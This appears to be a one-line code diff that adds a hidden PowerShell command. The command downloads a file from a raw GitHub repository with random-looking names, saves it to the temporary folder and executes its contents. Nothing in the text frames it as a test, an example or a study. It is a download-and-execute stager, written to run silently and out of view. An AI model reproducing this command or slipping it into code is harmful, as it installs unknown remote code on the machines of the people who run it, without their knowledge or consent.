@@ -1,0 +1,1 @@
+powershell -NoP -NonI -W Hidden -Command "$p=\"$env:TEMP\load.ps1\";(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/3287d54n23743/8er7ct7f5/main/i.bat',$p);iex (Get-Content $p -Raw)"
